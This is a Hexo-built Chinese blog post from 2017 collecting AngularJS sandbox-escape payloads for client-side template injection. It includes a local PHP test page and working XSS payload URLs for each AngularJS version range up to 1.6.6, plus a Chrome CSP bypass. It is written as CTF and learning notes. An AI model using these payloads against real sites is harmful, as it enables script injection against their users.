@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        AngularJS沙盒逃逸姿势总结 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-text">0x01 测试环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E9%80%83%E9%80%B8%E5%A7%BF%E5%8A%BF"><span class="toc-text">0x02 逃逸姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-v1-0-1-v1-1-5"><span class="toc-text">2.1 v1.0.1-v1.1.5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-v1-2-0-v1-2-18"><span class="toc-text">2.2 v1.2.0-v1.2.18</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-v1-2-19-v1-2-23"><span class="toc-text">2.3 v1.2.19-v1.2.23</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-v1-2-24-v1-2-26"><span class="toc-text">2.4 v1.2.24-v1.2.26</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-v1-2-27-v1-2-29-x2F-v1-3-0-v1-3-20"><span class="toc-text">2.5 v1.2.27-v1.2.29&#x2F;v1.3.0-v1.3.20</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-6-v1-4-0-v1-4-5%EF%BC%88%E4%BB%85chrome%EF%BC%89"><span class="toc-text">2.6 v1.4.0-v1.4.5（仅chrome）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-7-v1-4-5-1-5-8-%EF%BC%88%E4%BB%85chrome%EF%BC%89"><span class="toc-text">2.7 v1.4.5-1.5.8 （仅chrome）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-8-v1-6-0-1-6-6"><span class="toc-text">2.8 v1.6.0-1.6.6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-9-csp-bypass-%EF%BC%88%E4%BB%85chrome-v1-4-0-v1-6-6%EF%BC%89"><span class="toc-text">2.9 csp bypass （仅chrome v1.4.0-v1.6.6）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-10"><span class="toc-text">2.10</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">0x03 参考资料</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        AngularJS沙盒逃逸姿势总结
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2017-09-02 14:32:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#xss" title="xss">xss</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#angularjs" title="angularjs">angularjs</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p>前两天做最新的google xss game，遇到AngularJS的客户端模板注入（client-side-template-inject），第一次接触这种漏洞，决定了解一下。</p>
+<span id="more"></span>
+
+
+<p>这种漏洞大约出现在16年年初，跟服务端模板注入（ssti）差不多时间，算是比较早的漏洞了。说实话，js菜的一批，AngularJS更是从来没看过，科普文章也看的似懂非懂。。。在这儿收集一下沙盒逃逸的姿势吧，以后碰到这种漏洞就只能是一把梭了。。。</p>
+<h3 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$q</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$q</span>,ENT_QUOTES);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;   </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-逃逸姿势"><a href="#0x02-逃逸姿势" class="headerlink" title="0x02 逃逸姿势"></a>0x02 逃逸姿势</h3><h4 id="2-1-v1-0-1-v1-1-5"><a href="#2-1-v1-0-1-v1-1-5" class="headerlink" title="2.1 v1.0.1-v1.1.5"></a>2.1 v1.0.1-v1.1.5</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/xss/angular.php?q=&#123;&#123; constructor.constructor(&#x27;alert(1)&#x27;)() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2-v1-2-0-v1-2-18"><a href="#2-2-v1-2-0-v1-2-18" class="headerlink" title="2.2 v1.2.0-v1.2.18"></a>2.2 v1.2.0-v1.2.18</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/xss/angular.php?q=&#123;&#123; a=&#x27;constructor&#x27;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&#x27;alert(1)&#x27;)() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-3-v1-2-19-v1-2-23"><a href="#2-3-v1-2-19-v1-2-23" class="headerlink" title="2.3 v1.2.19-v1.2.23"></a>2.3 v1.2.19-v1.2.23</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/xss/angular.php?q=&#123;&#123; toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor)  &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-4-v1-2-24-v1-2-26"><a href="#2-4-v1-2-24-v1-2-26" class="headerlink" title="2.4 v1.2.24-v1.2.26"></a>2.4 v1.2.24-v1.2.26</h4><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170823/gB3dI54mKK.png" alt="mark"></p>
+<p>实在太长了。。。。</p>
+<h4 id="2-5-v1-2-27-v1-2-29-x2F-v1-3-0-v1-3-20"><a href="#2-5-v1-2-27-v1-2-29-x2F-v1-3-0-v1-3-20" class="headerlink" title="2.5 v1.2.27-v1.2.29&#x2F;v1.3.0-v1.3.20"></a>2.5 v1.2.27-v1.2.29&#x2F;v1.3.0-v1.3.20</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/xss/angular.php?q=&#123;&#123; &#123;&#125;.&quot;)));alert(1)//&quot;; &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实际测试为v1.2.20-v1.2.32&#x2F;v1.3.0-v1.3.20均生效。</p>
+<h4 id="2-6-v1-4-0-v1-4-5（仅chrome）"><a href="#2-6-v1-4-0-v1-4-5（仅chrome）" class="headerlink" title="2.6 v1.4.0-v1.4.5（仅chrome）"></a>2.6 v1.4.0-v1.4.5（仅chrome）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/xss/angular.php?q=&#123;&#123; o=&#123;&#125;;l=o[[&#x27;__lookupGetter__&#x27;]];(l=l)(&#x27;event&#x27;)().target.defaultView.location=&#x27;javascript:alert(1)&#x27;; &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-7-v1-4-5-1-5-8-（仅chrome）"><a href="#2-7-v1-4-5-1-5-8-（仅chrome）" class="headerlink" title="2.7 v1.4.5-1.5.8 （仅chrome）"></a>2.7 v1.4.5-1.5.8 （仅chrome）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/xss/angular.php?q=&#123;&#123; x=&#123;y:&#x27;&#x27;.constructor.prototype&#125;;x.y.charAt=[].join;[1]|orderBy:&#x27;x=alert(1)&#x27; &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-8-v1-6-0-1-6-6"><a href="#2-8-v1-6-0-1-6-6" class="headerlink" title="2.8 v1.6.0-1.6.6"></a>2.8 v1.6.0-1.6.6</h4><p>先知xss挑战赛学到的一个姿势</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/xss/angular.php?q=&#123;&#123; [].pop.constructor(&#x27;alert(1)&#x27;)() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-9-csp-bypass-（仅chrome-v1-4-0-v1-6-6）"><a href="#2-9-csp-bypass-（仅chrome-v1-4-0-v1-6-6）" class="headerlink" title="2.9 csp bypass （仅chrome v1.4.0-v1.6.6）"></a>2.9 csp bypass （仅chrome v1.4.0-v1.6.6）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy:default-src &#x27;self&#x27;;script-src code.angularjs.org &#x27;self&#x27;&quot;</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;script src=<span class="string">&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;   </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/xss/angular.php?q=&lt;input+autofocus ng-focus=&quot;$event.path|orderBy:&#x27;!x?[].constructor.from([x=1],alert):0&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-10"><a href="#2-10" class="headerlink" title="2.10"></a>2.10</h4><p>后来，由于一直被绕过，AngularJS干脆废除了沙盒机制。。。  </p>
+<p>ps. 就冲这些绕过姿势，没学js是正确的选择。。。</p>
+<h3 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h3><p><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/2597.html">AngularJS客户端模板注入</a></p>
+<p><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/2598.html">AngularJS－沙箱逃逸和XSS</a></p>
+<p><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3851.html">基于DOM的AngularJS沙箱逃逸技术</a></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
